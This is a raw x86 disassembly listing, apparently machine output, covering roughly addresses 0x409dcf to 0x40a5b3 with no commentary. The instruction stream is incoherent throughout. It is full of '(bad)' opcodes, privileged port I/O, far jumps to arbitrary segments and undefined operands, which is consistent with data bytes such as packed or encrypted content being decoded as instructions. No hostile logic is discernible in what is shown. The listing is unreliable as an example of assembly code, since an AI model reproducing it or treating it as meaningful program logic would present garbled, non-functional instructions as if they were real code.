  409dcf:	clc    
  409dd0:	jmp    0x409df7
  409dd2:	add    al,0x66
  409dd4:	lahf   
  409dd5:	cmc    
  409dd6:	ret    
  409dd7:	mov    edx,0x6cb1da3b
  409ddc:	pop    DWORD PTR [edi-0x2d]
  409ddf:	mov    dl,0x0
  409de1:	shl    BYTE PTR [ebx-0x216e8e1f],cl
  409de7:	sbb    eax,0xf3a13f60
  409dec:	dec    ecx
  409ded:	in     al,0x1a
  409def:	pop    eax
  409df0:	push   ds
  409df1:	mov    DWORD PTR [esp+edx*2],ebp
  409df4:	adc    BYTE PTR [ebp-0x2a9db12f],ah
  409dfa:	cmp    eax,0x323bb7b7
  409dff:	out    0xbc,eax
  409e01:	repnz mov esp,0x29275a8e
  409e07:	xchg   esi,eax
  409e08:	repnz and DWORD PTR ds:0x797f8810,ebp
  409e0f:	(bad)  [esi]
  409e11:	cmp    cl,dh
  409e13:	repz fild WORD PTR [ebx-0x4575dbe4]
  409e1a:	sbb    eax,DWORD PTR [esi]
  409e1c:	cwde   
  409e1d:	dec    edx
  409e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e1f:	nop
  409e20:	ss repz inc esi
  409e23:	sbb    eax,0xe665be13
  409e28:	mov    al,0xed
  409e2a:	scas   eax,DWORD PTR es:[edi]
  409e2b:	jno    0x409e37
  409e2d:	gs repz mov ebp,0x2b9b7173
  409e34:	test   edi,ecx
  409e36:	int3   
  409e37:	add    eax,0x7723e307
  409e3c:	popa   
  409e3d:	add    eax,0xd64920fd
  409e42:	aas    
  409e43:	mov    edi,DWORD PTR ds:0xdf46645e
  409e49:	inc    edx
  409e4a:	jbe    0x409dfd
  409e4c:	dec    edx
  409e4d:	jg     0x409e26
  409e4f:	pop    eax
  409e50:	pushf  
  409e51:	adc    al,0x24
  409e53:	dec    esi
  409e54:	xor    eax,0x62d100c0
  409e59:	imul   DWORD PTR [ecx+eax*1-0x74b9cdfb]
  409e60:	aad    0x6b
  409e62:	mov    edi,eax
  409e64:	pop    ebp
  409e65:	enter  0x10ab,0x71
  409e69:	mov    ch,0xb1
  409e6b:	adc    al,0xbf
  409e6d:	in     eax,0xee
  409e6f:	test   eax,0xc699df4a
  409e74:	das    
  409e75:	push   esp
  409e76:	lock mov bl,0x9b
  409e79:	sbb    DWORD PTR [edx+0x2a8349cd],eax
  409e7f:	mov    al,0x31
  409e81:	ds int3 
  409e83:	jmp    0x7ae8:0x6c12e9
  409e8a:	out    0x59,eax
  409e8c:	sbb    esi,DWORD PTR [edx-0x3a9293a8]
  409e92:	pusha  
  409e93:	cmp    al,0x26
  409e95:	xor    al,0x71
  409e97:	in     eax,0x76
  409e99:	int    0x59
  409e9b:	push   ss
  409e9c:	adc    bh,BYTE PTR [ecx]
  409e9e:	ins    BYTE PTR es:[edi],dx
  409e9f:	or     al,cl
  409ea1:	jae    0x409e39
  409ea3:	and    BYTE PTR [ebx-0x439e76fb],dh
  409ea9:	pop    edi
  409eaa:	jo     0x409e31
  409eac:	enter  0x3b43,0x62
  409eb0:	add    dh,BYTE PTR [edx+ebp*4-0x68]
  409eb4:	or     DWORD PTR [eax-0x6d8a94f3],ebx
  409eba:	outs   dx,DWORD PTR ds:[esi]
  409ebb:	repz test BYTE PTR [ecx],bh
  409ebe:	sbb    BYTE PTR [edx+0x45eb702c],bl
  409ec4:	rcr    BYTE PTR [esi+0x62],1
  409ec7:	daa    
  409ec8:	dec    eax
  409ec9:	stc    
  409eca:	mov    ebx,0xe10e30f1
  409ecf:	mov    esi,0x57ad7f22
  409ed4:	(bad)  [edi]
  409ed6:	dec    edi
  409ed7:	shr    BYTE PTR [esi],0x35
  409eda:	je     0x409ed0
  409edc:	je     0x409eb2
  409ede:	repz jmp 0x409ec8
  409ee1:	push   ebx
  409ee2:	push   esi
  409ee3:	xchg   ecx,eax
  409ee4:	jp     0x409ee2
  409ee6:	mov    edx,0x75518117
  409eeb:	jne    0x409e94
  409eed:	test   eax,0x260f216a
  409ef2:	fwait
  409ef3:	retf   0x6412
  409ef6:	imul   ebp,DWORD PTR [esp+ebp*8],0x4967fbb
  409efd:	and    al,0x13
  409eff:	retf   
  409f00:	xchg   ebx,eax
  409f01:	retf   0xa8da
  409f04:	dec    ecx
  409f05:	jmp    0xcc67043d
  409f0a:	mov    al,0xee
  409f0c:	pop    es
  409f0d:	xchg   DWORD PTR [ecx],ebx
  409f0f:	js     0x409f59
  409f11:	rol    DWORD PTR [eax+eiz*2+0xd07c3],cl
  409f18:	xor    al,0x9f
  409f1a:	stos   BYTE PTR es:[edi],al
  409f1b:	mov    ds,WORD PTR [esi+0x23]
  409f1e:	push   edx
  409f1f:	or     eax,0xeab185bd
  409f24:	sub    DWORD PTR [bx+si],esp
  409f27:	cld    
  409f28:	out    0xeb,al
  409f2a:	xlat   BYTE PTR ds:[ebx]
  409f2b:	arpl   WORD PTR [eax+ebp*2-0x41f7d37c],di
  409f32:	xchg   esi,eax
  409f33:	test   eax,0xcd264b16
  409f38:	sti    
  409f39:	mov    esi,0xd3c361ec
  409f3e:	pop    edx
  409f3f:	sahf   
  409f40:	into   
  409f41:	inc    esp
  409f42:	dec    ebp
  409f43:	arpl   WORD PTR [esi-0x2f1eaf73],bp
  409f49:	cmc    
  409f4a:	mov    edi,0xb5c55cfe
  409f4f:	repnz and BYTE PTR [eax+0x35],bl
  409f53:	sbb    BYTE PTR [ecx+0x7f],ch
  409f56:	leave  
  409f57:	not    esp
  409f59:	retf   0x248a
  409f5c:	push   0xffffffde
  409f5e:	out    dx,al
  409f5f:	sub    cl,BYTE PTR [ebx+0x6036a379]
  409f65:	mov    al,ds:0x759323fe
  409f6a:	cdq    
  409f6b:	in     al,dx
  409f6c:	sub    eax,0xd4b77753
  409f71:	xor    esi,DWORD PTR [edi]
  409f73:	sbb    BYTE PTR [ecx-0x43a49928],0xb4
  409f7a:	pop    edi
  409f7b:	or     cl,BYTE PTR [edx+0x3949b304]
  409f81:	aam    0x73
  409f83:	outs   dx,DWORD PTR ds:[esi]
  409f84:	xlat   BYTE PTR ds:[ebx]
  409f85:	inc    ecx
  409f86:	sub    BYTE PTR [eax+0x61abdb9e],0x1c
  409f8d:	and    dl,dh
  409f8f:	ret    0xd5a
  409f92:	ret    
  409f93:	daa    
  409f94:	mov    eax,0x57709f03
  409f99:	mov    ecx,0xf126ea7f
  409f9e:	push   es
  409f9f:	into   
  409fa0:	cs jbe 0x409fa6
  409fa3:	mov    ebx,DWORD PTR [eax]
  409fa5:	test   DWORD PTR ds:0xd9d092b3,ebp
  409fab:	and    eax,0x5135010e
  409fb0:	dec    ebx
  409fb1:	pop    eax
  409fb2:	cwde   
  409fb3:	sar    DWORD PTR [eax-0x5eb133f8],cl
  409fb9:	sub    eax,ebp
  409fbb:	outs   dx,DWORD PTR ds:[esi]
  409fbc:	cmp    ah,BYTE PTR [edx+esi*4-0x57776517]
  409fc3:	jb     0x409f94
  409fc5:	adc    DWORD PTR ds:0x3edbb2e9,0x31536fb5
  409fcf:	or     eax,0x6dd762b
  409fd4:	js     0x40a037
  409fd6:	(bad)  [edx]
  409fd8:	sub    eax,0xd76a0575
  409fdd:	int3   
  409fde:	rcr    BYTE PTR [esi+0x2e381f84],1
  409fe4:	je     0x40a03e
  409fe6:	inc    esp
  409fe7:	mov    edi,0x4d11ab51
  409fec:	imul   edi,DWORD PTR [ecx],0x38
  409fef:	cmc    
  409ff0:	xchg   ebx,eax
  409ff1:	inc    edx
  409ff2:	jl     0x409fe7
  409ff4:	ss xor al,0x84
  409ff7:	js     0x40a060
  409ff9:	mov    eax,0x726113fb
  409ffe:	and    esi,edi
  40a000:	cmp    eax,0x185e2859
  40a005:	loopne 0x409fdb
  40a007:	lahf   
  40a008:	or     bh,bl
  40a00a:	jecxz  0x409fb9
  40a00c:	gs scas eax,DWORD PTR es:[edi]
  40a00e:	push   cs
  40a00f:	jge    0x40a030
  40a011:	std    
  40a012:	in     al,dx
  40a013:	jecxz  0x409ffd
  40a015:	jnp    0x40a021
  40a017:	scas   al,BYTE PTR es:[edi]
  40a018:	and    dl,BYTE PTR [edi+0x594533e4]
  40a01e:	adc    BYTE PTR [esi-0x308ffaf6],bh
  40a024:	std    
  40a025:	pop    esi
  40a026:	cld    
  40a027:	cmp    al,BYTE PTR [edx+0x6ae9c135]
  40a02d:	les    ebx,FWORD PTR [esi+0x7d]
  40a030:	fs xor eax,0xb7007b4d
  40a036:	das    
  40a037:	out    dx,al
  40a038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a039:	fiadd  DWORD PTR [ebx]
  40a03b:	mov    edx,0x18abc3bb
  40a040:	cwde   
  40a041:	mov    al,ds:0x10350ea2
  40a046:	idiv   DWORD PTR [ebp+esi*2-0x7eabf2c1]
  40a04d:	jnp    0x409fe9
  40a04f:	xchg   ebp,eax
  40a050:	data16 sbb al,0x89
  40a053:	push   esi
  40a054:	imul   ecx,ebp,0xffffffd9
  40a057:	pop    ss
  40a058:	pop    edi
  40a059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a05a:	dec    ebx
  40a05b:	call   0xc8f07df9
  40a060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a061:	sub    al,0x3e
  40a063:	inc    edi
  40a064:	ja     0x40a036
  40a066:	jo     0x40a00e
  40a068:	pop    edi
  40a069:	addr16 push eax
  40a06b:	inc    ebx
  40a06c:	xchg   esi,eax
  40a06d:	jmp    0xf5ff5129
  40a072:	or     BYTE PTR [edx-0x7b],ch
  40a075:	sahf   
  40a076:	dec    sp
  40a078:	and    cl,BYTE PTR [esi]
  40a07a:	jbe    0x40a0e0
  40a07c:	ret    0x2c01
  40a07f:	pop    edi
  40a080:	push   ds
  40a081:	or     DWORD PTR [ecx],edx
  40a083:	std    
  40a084:	pop    edx
  40a085:	jle    0x40a0db
  40a087:	dec    esp
  40a088:	outs   dx,BYTE PTR ds:[esi]
  40a08a:	cwde   
  40a08b:	mov    ds:0xa6f8f9b5,eax
  40a090:	and    al,0x2e
  40a092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a093:	enter  0xf931,0xf5
  40a097:	pop    esp
  40a098:	(bad)  
  40a099:	push   esp
  40a09a:	xor    eax,0x8a622e8d
  40a09f:	sub    BYTE PTR [ecx],ah
  40a0a1:	mov    dl,0x55
  40a0a3:	xchg   ebp,eax
  40a0a4:	jecxz  0x40a049
  40a0a6:	into   
  40a0a7:	mov    esi,0xbdf06922
  40a0ac:	push   esp
  40a0ad:	cmp    eax,0xbc7dbe7f
  40a0b2:	jg     0x40a085
  40a0b4:	call   0x896325e
  40a0b9:	pavgw  mm3,QWORD PTR ds:0x16ad8d1b
  40a0c0:	aaa    
  40a0c1:	jl     0x40a047
  40a0c3:	sbb    DWORD PTR [edx],esi
  40a0c5:	cmc    
  40a0c6:	or     dl,BYTE PTR [ebp-0x30]
  40a0c9:	mov    dh,0x21
  40a0cb:	inc    edx
  40a0cc:	in     eax,dx
  40a0cd:	jl     0x40a08a
  40a0cf:	mov    ds:0x799af82f,eax
  40a0d4:	push   0x7d4886df
  40a0d9:	fst    DWORD PTR [ecx-0x41bc5134]
  40a0df:	out    0xd4,eax
  40a0e1:	fdivr  QWORD PTR [edi]
  40a0e3:	adc    ch,BYTE PTR [ebp+0xc]
  40a0e6:	and    ecx,edi
  40a0e8:	(bad)  
  40a0e9:	not    BYTE PTR [edi+0x49]
  40a0ec:	leave  
  40a0ed:	add    bl,BYTE PTR [esi]
  40a0ef:	repnz (bad) 
  40a0f1:	mov    ah,0xbf
  40a0f3:	dec    edx
  40a0f4:	ret    0xc1c0
  40a0f7:	test   DWORD PTR [ebx+0x60],esi
  40a0fa:	mov    ebp,0xc1dd86c6
  40a0ff:	mov    ebx,0x9c90d462
  40a104:	mov    edi,0xda7c4a1f
  40a109:	lds    ebp,FWORD PTR [edi-0xcc21547]
  40a10f:	inc    edi
  40a110:	or     DWORD PTR [edi-0x11],esp
  40a113:	push   cs
  40a114:	adc    ch,BYTE PTR [eax-0x7796293c]
  40a11a:	imul   esi,DWORD PTR [ecx-0x7378582],0x2a38cd1f
  40a124:	je     0x40a17a
  40a126:	xchg   ebp,eax
  40a127:	jmp    0x40a150
  40a129:	fcom   DWORD PTR [ebx-0x63]
  40a12c:	nop
  40a12d:	repnz aam 0x9b
  40a130:	pop    edi
  40a131:	sub    ebp,edx
  40a133:	dec    ebp
  40a134:	inc    edx
  40a135:	(bad)  
  40a136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a137:	push   esp
  40a138:	jae    0x40a101
  40a13a:	or     ch,BYTE PTR [eax+ecx*4+0x4c]
  40a13e:	(bad)  
  40a13f:	out    0xbf,al
  40a141:	and    esp,edx
  40a143:	pop    gs
  40a145:	mov    esi,0x7e3d76dd
  40a14a:	sbb    dh,BYTE PTR [ebx-0x17]
  40a14d:	jnp    0x40a1c1
  40a14f:	dec    ecx
  40a150:	push   edi
  40a151:	sub    ebx,esp
  40a153:	outs   dx,BYTE PTR ds:[esi]
  40a154:	lahf   
  40a155:	scas   eax,DWORD PTR es:[edi]
  40a156:	add    al,0x67
  40a158:	or     eax,0x7a974b5d
  40a15d:	pop    edi
  40a15e:	xchg   edx,eax
  40a15f:	adc    edx,DWORD PTR [edx+0x33497b59]
  40a165:	mov    ecx,0x965e6968
  40a16a:	and    esp,ebx
  40a16c:	mov    dh,0x82
  40a16e:	inc    ecx
  40a16f:	dec    esp
  40a170:	pop    ss
  40a171:	lock sub al,0xd6
  40a174:	test   BYTE PTR [edi-0x76],ah
  40a177:	cmp    al,0xa2
  40a179:	jp     0x40a17f
  40a17b:	int    0x4b
  40a17d:	pop    ebx
  40a17e:	loope  0x40a15d
  40a180:	popa   
  40a181:	push   cs
  40a182:	xor    ah,dl
  40a184:	push   esi
  40a185:	lock add eax,0xe13a39a9
  40a18b:	pop    ecx
  40a18c:	sub    al,BYTE PTR [ebp+0x4b5e5020]
  40a192:	mov    esp,0x31887444
  40a197:	push   esp
  40a198:	sti    
  40a199:	test   BYTE PTR [ebx],al
  40a19b:	sbb    al,0xfc
  40a19d:	push   edx
  40a19e:	pop    es
  40a19f:	jne    0x40a127
  40a1a1:	and    eax,0x7b99679b
  40a1a6:	or     al,0x69
  40a1a8:	or     DWORD PTR [eax+0x6c],edx
  40a1ab:	or     al,0x7c
  40a1ad:	and    ecx,DWORD PTR [edi+0x73ec6a0b]
  40a1b3:	xor    ah,0x48
  40a1b6:	lock fistp QWORD PTR [eax]
  40a1b9:	push   ecx
  40a1ba:	inc    edi
  40a1bb:	sub    DWORD PTR [esi-0x49],edi
  40a1be:	pop    edx
  40a1bf:	pop    ds
  40a1c0:	jge    0x40a1aa
  40a1c2:	in     al,dx
  40a1c3:	sbb    bh,bl
  40a1c5:	gs (bad) 
  40a1c7:	mov    bh,0xda
  40a1c9:	fcmovne st,st(5)
  40a1cb:	lahf   
  40a1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1cd:	jmp    0xebfd:0xd3ee1cc9
  40a1d4:	or     DWORD PTR [ecx],ecx
  40a1d6:	ret    
  40a1d7:	and    ebx,edx
  40a1d9:	ret    
  40a1da:	push   esi
  40a1db:	xchg   ecx,eax
  40a1dc:	inc    ebp
  40a1dd:	sbb    al,0xbf
  40a1df:	or     al,0xcb
  40a1e1:	shl    BYTE PTR [edi+ecx*1],0x77
  40a1e5:	jne    0x40a1ba
  40a1e7:	push   ebx
  40a1e8:	mov    dh,0xce
  40a1ea:	mov    dl,0xef
  40a1ec:	leave  
  40a1ed:	push   ebx
  40a1ee:	addr16 push ss
  40a1f0:	lock in eax,0x54
  40a1f3:	jbe    0x40a20a
  40a1f5:	mov    ah,BYTE PTR [ebp+0x13]
  40a1f8:	mov    esp,0x87c6695f
  40a1fd:	call   0x83b5018
  40a202:	iret   
  40a203:	cli    
  40a204:	stos   DWORD PTR es:[edi],eax
  40a205:	arpl   WORD PTR [ecx-0x1e04c93a],ax
  40a20b:	leave  
  40a20c:	int3   
  40a20d:	fisttp DWORD PTR [edi+0x65]
  40a210:	test   eax,0x730136ce
  40a215:	mov    ebp,0xfe8fd3ed
  40a21a:	lea    esp,[edi]
  40a21c:	sbb    eax,0xe09984f8
  40a221:	mov    ch,0x6b
  40a223:	jg     0x40a1a6
  40a225:	test   eax,0x85d397f8
  40a22b:	cmp    ecx,DWORD PTR [ecx-0x7eb3b817]
  40a231:	mov    ecx,0x35420db1
  40a236:	in     eax,0x3d
  40a238:	sbb    edi,DWORD PTR [edi+esi*1+0x60]
  40a23c:	mov    al,ds:0xfc4f74f5
  40a241:	mov    ebx,0x36bbbe63
  40a246:	xchg   esi,eax
  40a247:	inc    ebp
  40a248:	mov    edx,0xcd3b2e3
  40a24d:	sub    DWORD PTR [ecx-0x5b543132],ebx
  40a253:	ja     0x40a2a7
  40a255:	shr    BYTE PTR [ecx+0x63bdb80d],0x6f
  40a25c:	pop    esp
  40a25d:	add    cl,ah
  40a25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a260:	jg     0x40a238
  40a262:	inc    ebp
  40a263:	mov    esi,0x4dbd93e5
  40a268:	imul   esi,esi,0xf98a2988
  40a26e:	lahf   
  40a26f:	out    0x71,eax
  40a271:	xor    ch,ch
  40a273:	dec    ecx
  40a274:	data16 sbb BYTE PTR [ebx+0x4e],bh
  40a278:	push   edi
  40a279:	stos   DWORD PTR es:[edi],eax
  40a27a:	repz mov ecx,0x92dadbab
  40a280:	and    cl,al
  40a282:	clc    
  40a283:	mov    edi,?
  40a285:	pop    ecx
  40a286:	push   0xf0a64eff
  40a28b:	rcr    BYTE PTR [ebx],cl
  40a28d:	jmp    0x40a2b7
  40a28f:	lock mov ecx,0x37129f30
  40a295:	stos   DWORD PTR es:[edi],eax
  40a296:	jae    0x40a25c
  40a298:	push   es
  40a299:	popa   
  40a29a:	(bad)  
  40a29b:	retf   
  40a29c:	add    BYTE PTR [edi+0x7b7b6365],ch
  40a2a2:	ins    DWORD PTR es:[edi],dx
  40a2a3:	cmp    BYTE PTR [edx+0x1d66395f],ah
  40a2a9:	inc    BYTE PTR [eax]
  40a2ab:	sti    
  40a2ac:	out    dx,al
  40a2ad:	xchg   esi,eax
  40a2ae:	mov    esi,0x969a6b92
  40a2b3:	aam    0x21
  40a2b5:	rol    DWORD PTR [eax],0x65
  40a2b8:	push   edi
  40a2b9:	(bad)  
  40a2ba:	pop    ds
  40a2bb:	lods   al,BYTE PTR ds:[esi]
  40a2bc:	dec    edi
  40a2bd:	mov    eax,ds:0xdb4ae902
  40a2c2:	sub    ecx,esi
  40a2c4:	mov    ds:0x6797f2b7,eax
  40a2c9:	adc    ebp,DWORD PTR [edx-0x7e815dbb]
  40a2cf:	in     eax,0x68
  40a2d1:	push   eax
  40a2d2:	dec    esi
  40a2d3:	jns    0x40a27c
  40a2d5:	pusha  
  40a2d6:	dec    eax
  40a2d7:	xchg   esi,eax
  40a2d8:	das    
  40a2d9:	add    eax,DWORD PTR [edi+0x7842647e]
  40a2df:	cmp    BYTE PTR [eax],dh
  40a2e1:	sahf   
  40a2e2:	adc    ah,cl
  40a2e4:	outs   dx,DWORD PTR ds:[esi]
  40a2e5:	xchg   esp,eax
  40a2e6:	fcmovne st,st(6)
  40a2e8:	lock pop ebx
  40a2ea:	fisub  WORD PTR [ecx+0x4624be6a]
  40a2f0:	jg     0x40a2e6
  40a2f2:	push   es
  40a2f3:	cdq    
  40a2f4:	pop    ebx
  40a2f5:	(bad)  
  40a2f6:	and    eax,0xe1de898f
  40a2fb:	jmp    0xf743:0xd964850c
  40a302:	mov    dh,dl
  40a304:	push   eax
  40a305:	mov    al,ds:0xdc4a4b9f
  40a30a:	inc    esi
  40a30b:	adc    edi,DWORD PTR [edi-0x60a3f620]
  40a311:	dec    eax
  40a312:	xchg   ebp,eax
  40a313:	in     eax,0xd8
  40a315:	add    eax,0xa3874204
  40a31a:	xchg   ecx,eax
  40a31b:	or     cl,BYTE PTR [eax+0x77a2bc7e]
  40a321:	int    0x5b
  40a323:	xor    DWORD PTR [ebp-0x2d],esi
  40a326:	or     DWORD PTR [edi],ebx
  40a328:	adc    DWORD PTR [eax+eax*8-0x362ccf8a],esp
  40a32f:	scas   al,BYTE PTR es:[edi]
  40a330:	lahf   
  40a331:	call   0xbf214233
  40a336:	lds    esp,FWORD PTR [edi]
  40a338:	lods   al,BYTE PTR ds:[esi]
  40a339:	pop    eax
  40a33a:	sar    DWORD PTR [ebp-0x28f10f5b],cl
  40a340:	push   ebp
  40a341:	mov    edx,0xdfcfd9e9
  40a346:	(bad)  
  40a347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a348:	jl     0x40a2fe
  40a34a:	pop    edi
  40a34b:	mov    ch,0x2d
  40a34d:	pop    edi
  40a34e:	push   cs
  40a34f:	mov    eax,0x506df188
  40a354:	mov    edx,0x5072cefb
  40a359:	fdivr  DWORD PTR [edx+0xc]
  40a35c:	push   ebx
  40a35d:	mov    DWORD PTR [ecx-0x5924bd4e],0x6e72705b
  40a367:	pop    eax
  40a368:	push   esp
  40a369:	adc    DWORD PTR [edx-0x2a],ebx
  40a36c:	jg     0x40a334
  40a36e:	lahf   
  40a36f:	mov    esi,0x3aafe2a4
  40a374:	cmp    al,bl
  40a376:	mov    BYTE PTR [edx+0x4],bl
  40a379:	add    eax,0x3bffa7e9
  40a37e:	cmp    DWORD PTR [esi-0x45943225],esp
  40a384:	fwait
  40a385:	ss jmp 0x9542:0xa6387d1e
  40a38d:	push   ebp
  40a38e:	add    DWORD PTR [eax-0x69dc9ca3],ebx
  40a394:	xor    al,0x45
  40a396:	mov    bh,0x5c
  40a398:	push   ds
  40a399:	arpl   WORD PTR [edi],sp
  40a39b:	sub    al,0x32
  40a39d:	mov    eax,0xe40f397e
  40a3a2:	aaa    
  40a3a3:	mov    al,ah
  40a3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3a6:	add    al,0x83
  40a3a8:	les    eax,FWORD PTR [eax]
  40a3aa:	cmp    esi,DWORD PTR [ecx+0x441fcaf6]
  40a3b0:	and    dl,BYTE PTR [esi+0xd3ed65]
  40a3b6:	xlat   BYTE PTR ds:[ebx]
  40a3b7:	jmp    0x91f1f494
  40a3bc:	aad    0xe
  40a3be:	out    0xfd,al
  40a3c0:	and    BYTE PTR [ecx+0x11],bl
  40a3c3:	inc    ebx
  40a3c4:	jae    0x40a43b
  40a3c6:	or     ebp,DWORD PTR [ecx+eax*2]
  40a3c9:	mov    al,ds:0xdba6ff16
  40a3ce:	sbb    ah,ch
  40a3d0:	call   0xe201:0x7a78c518
  40a3d7:	xor    ah,BYTE PTR [ebx+0x5511866a]
  40a3dd:	mov    edi,0x9e5b3a11
  40a3e2:	sub    DWORD PTR [ecx-0x42],ebx
  40a3e5:	pop    edi
  40a3e6:	jmp    0x183c:0xf208455b
  40a3ed:	push   0x15e8adc5
  40a3f2:	loope  0x40a381
  40a3f4:	ins    DWORD PTR es:[edi],dx
  40a3f5:	fcomp  QWORD PTR [edx]
  40a3f7:	in     al,0x21
  40a3f9:	call   0x3ed7:0xb08716ab
  40a400:	xor    esp,DWORD PTR [ecx]
  40a402:	mov    eax,ds:0xb39c1784
  40a407:	stos   BYTE PTR es:[edi],al
  40a408:	lahf   
  40a409:	loope  0x40a468
  40a40b:	jmp    0x40a3f3
  40a40d:	lds    ebp,FWORD PTR [edi+eax*2+0x3b8144a3]
  40a414:	arpl   WORD PTR ds:0xf6d63ba1,bp
  40a41a:	inc    eax
  40a41b:	div    al
  40a41d:	in     eax,dx
  40a41e:	jne    0x40a402
  40a420:	adc    bl,BYTE PTR [edx]
  40a422:	cwde   
  40a423:	(bad)  
  40a424:	rol    DWORD PTR [edi-0x19],1
  40a427:	mov    WORD PTR [eax],ds
  40a429:	or     BYTE PTR [esi+0x8],0x94
  40a42d:	add    DWORD PTR [eax],0x2c9009b5
  40a433:	or     bh,BYTE PTR [eax]
  40a435:	mov    ebp,0x63e894c0
  40a43a:	jo     0x40a499
  40a43c:	pushf  
  40a43d:	adc    edi,DWORD PTR [edx-0x7e]
  40a440:	inc    ebp
  40a441:	mov    ds:0x970305ba,al
  40a446:	es fs pushf 
  40a449:	lahf   
  40a44a:	sbb    BYTE PTR [eax],dl
  40a44c:	pushf  
  40a44d:	jmp    0x40a3f5
  40a44f:	mov    dh,0xde
  40a451:	dec    edi
  40a452:	xchg   edi,eax
  40a453:	cwde   
  40a454:	mov    bl,0x75
  40a456:	sbb    cl,ch
  40a458:	sbb    eax,DWORD PTR [edx-0x26]
  40a45b:	ret    0x1160
  40a45e:	lea    ecx,[esi]
  40a460:	fiadd  WORD PTR [esi-0x2]
  40a463:	scas   eax,DWORD PTR es:[edi]
  40a464:	or     ecx,DWORD PTR [esi+ebp*2+0x24]
  40a468:	mov    ah,0x87
  40a46a:	fimul  DWORD PTR [eax-0x7d]
  40a46d:	mov    edi,0x4c684f69
  40a472:	push   ecx
  40a473:	js     0x40a490
  40a475:	rcr    DWORD PTR [ebx-0x21281ba0],1
  40a47b:	bnd jge 0x40a43d
  40a47e:	mov    esi,0xaea0d9a3
  40a483:	or     al,0x19
  40a485:	xchg   edi,eax
  40a486:	xchg   ebp,eax
  40a487:	cld    
  40a488:	in     eax,0x10
  40a48a:	pop    eax
  40a48b:	cmp    eax,0x7e9f5a71
  40a490:	leave  
  40a491:	nop
  40a492:	push   ds
  40a493:	repz fadd st,st(7)
  40a496:	into   
  40a497:	jp     0x40a431
  40a499:	cmp    ah,BYTE PTR [ecx+0x569e9e84]
  40a49f:	xchg   esi,eax
  40a4a0:	ins    BYTE PTR es:[edi],dx
  40a4a1:	jge    0x40a48e
  40a4a3:	icebp  
  40a4a4:	mov    esp,0xede4142
  40a4a9:	mov    ds:0xac4cefd5,eax
  40a4ae:	mov    ?,WORD PTR [ebp-0xdec0346]
  40a4b4:	mov    eax,ds:0x45910650
  40a4b9:	popa   
  40a4ba:	adc    BYTE PTR [edi+0x5add1f13],0x11
  40a4c1:	test   al,0xaf
  40a4c3:	sub    bh,ah
  40a4c5:	or     al,0x4c
  40a4c7:	mov    BYTE PTR [ecx-0x3a],dh
  40a4ca:	pop    eax
  40a4cb:	mov    edi,0xcbfd974a
  40a4d0:	cwde   
  40a4d1:	stos   DWORD PTR es:[edi],eax
  40a4d2:	shr    BYTE PTR [eax-0x2687ef3e],0x2b
  40a4d9:	adc    ebx,DWORD PTR [edx+ebp*2]
  40a4dc:	sub    ah,ah
  40a4de:	call   0xd8fc3f0c
  40a4e3:	adc    dl,bh
  40a4e5:	clc    
  40a4e6:	(bad)  
  40a4e7:	mov    esp,0x7bacd921
  40a4ec:	test   eax,0x8513af4
  40a4f1:	out    0x31,al
  40a4f3:	xchg   edi,eax
  40a4f4:	mov    BYTE PTR [ecx+0x3d],bh
  40a4f7:	adc    eax,ecx
  40a4f9:	xchg   DWORD PTR [ebp-0x66c8b92],eax
  40a4ff:	cdq    
  40a500:	adc    esi,edi
  40a502:	jo     0x40a4f1
  40a504:	mov    eax,0xdad3bff9
  40a509:	retf   
  40a50a:	push   cs
  40a50b:	(bad)  
  40a50c:	mov    BYTE PTR [edx-0x6bc12057],al
  40a512:	in     al,0x1e
  40a514:	mov    al,bl
  40a516:	jb     0x40a4dd
  40a518:	stos   BYTE PTR es:[edi],al
  40a519:	jne    0x40a511
  40a51b:	je     0x40a50c
  40a51d:	lock scas eax,DWORD PTR es:[edi]
  40a51f:	int3   
  40a520:	pushw  ds
  40a522:	jg     0x40a59e
  40a524:	push   esi
  40a525:	into   
  40a526:	fisttp QWORD PTR [edi-0x459444af]
  40a52c:	and    al,0xf0
  40a52e:	call   DWORD PTR [eax-0xd73e2d5]
  40a534:	ins    DWORD PTR es:[edi],dx
  40a535:	ret    
  40a536:	sub    edx,eax
  40a538:	mov    ds:0x3b8279f7,eax
  40a53d:	mov    al,fs:0x95f54591
  40a543:	into   
  40a544:	scas   al,BYTE PTR es:[edi]
  40a545:	(bad)  
  40a547:	mov    BYTE PTR [ebx],al
  40a549:	pop    edx
  40a54a:	push   ebp
  40a54b:	xor    DWORD PTR [ecx],edx
  40a54d:	iret   
  40a54e:	push   ecx
  40a54f:	jecxz  0x40a594
  40a551:	pusha  
  40a552:	repz daa 
  40a554:	loop   0x40a4fe
  40a556:	adc    al,0xd7
  40a558:	ret    0xe98e
  40a55b:	in     eax,0x1a
  40a55d:	and    ecx,DWORD PTR [ebx+0x1b59dcd2]
  40a563:	retf   
  40a564:	je     0x40a510
  40a566:	xchg   BYTE PTR [esi],bl
  40a568:	jmp    0xd9ab:0x89c72c8b
  40a56f:	jge    0x40a597
  40a571:	mov    al,ds:0x95c47298
  40a576:	cs cmp esi,edi
  40a579:	jbe    0x40a54f
  40a57b:	sbb    eax,0x248c8d68
  40a580:	mov    bh,cl
  40a582:	and    al,dh
  40a584:	mov    ebp,0x996f034c
  40a589:	push   esp
  40a58a:	pop    ebp
  40a58b:	xchg   edx,eax
  40a58c:	pop    esp
  40a58d:	jmp    0x2682db76
  40a592:	into   
  40a593:	scas   eax,DWORD PTR es:[edi]
  40a594:	into   
  40a595:	add    eax,esp
  40a597:	and    DWORD PTR [edi-0x760d128],esi
  40a59d:	popf   
  40a59e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a59f:	shr    DWORD PTR [esi+eax*2+0x712b1100],1
  40a5a6:	xor    DWORD PTR ds:0xde708fd1,esi
  40a5ac:	xor    esi,ebx
  40a5ae:	push   ebp
  40a5af:	popf   
  40a5b0:	and    esp,DWORD PTR [ebx]
  40a5b2:	int3   
  40a5b3:	and    eax,0xcb7a1d68
